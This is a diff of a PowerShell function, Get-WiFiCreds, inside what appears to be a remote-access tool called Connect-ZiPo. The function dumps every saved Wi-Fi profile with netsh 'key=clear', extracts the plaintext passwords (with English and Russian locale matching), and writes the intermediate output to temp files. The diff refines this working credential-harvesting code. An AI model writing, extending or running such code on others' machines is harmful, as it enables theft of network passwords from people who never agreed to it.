@@ -84,10 +84,12 @@ function Connect-ZiPo {
 
    function Get-WiFiCreds {
     try {
-        $output = cmd /c "netsh wlan show profiles" | Out-String
-        $lines = $output -split "`r?`n"
+        $profilesFile = "$env:TEMP\wifi_profiles.txt"
+        cmd /c "netsh wlan show profiles > `"$profilesFile`"" | Out-Null
+        $lines = Get-Content $profilesFile -Encoding Default
 
-        $profiles = $lines | Where-Object { ($_ -like "*:*") -and ($_ -match "Profile") }
+        # Отбираем строки, где есть имя профиля
+        $profiles = $lines | Where-Object { $_ -like "*:*" -and $_ -match "Profile" }
 
         if (-not $profiles -or $profiles.Count -eq 0) {
             return "[INFO] No Wi-Fi profiles found."
@@ -95,18 +97,18 @@ function Connect-ZiPo {
 
         $results = ""
         foreach ($line in $profiles) {
-            $parts = $line -split ":"
+            $parts = $line -split ":", 2
             if ($parts.Count -lt 2) { continue }
             $profile = $parts[1].Trim()
 
             $results += "`n[$profile]`n"
 
-            $details = cmd /c "netsh wlan show profile name=""$profile"" key=clear" | Out-String
-            $detailLines = $details -split "`r?`n"
+            $profileFile = "$env:TEMP\wifi_profile_$($profile).txt"
+            cmd /c "netsh wlan show profile name=""$profile"" key=clear > `"$profileFile`"" | Out-Null
+            $details = Get-Content $profileFile -Encoding Default
 
-            # Поиск строки с содержимым ключа без regex
-            $keyLine = $detailLines | Where-Object {
-                ($_ -like "*Key Content*") -or ($_ -like "*Содержимое ключа*")
+            $keyLine = $details | Where-Object {
+                $_ -like "*Key Content*" -or $_ -like "*Содержимое ключа*"
             }
 
             if ($keyLine) {
@@ -122,7 +124,6 @@ function Connect-ZiPo {
         return "[ERROR] Failed to retrieve Wi-Fi credentials: $($_.Exception.Message)"
     }
 }
-
 
 
 
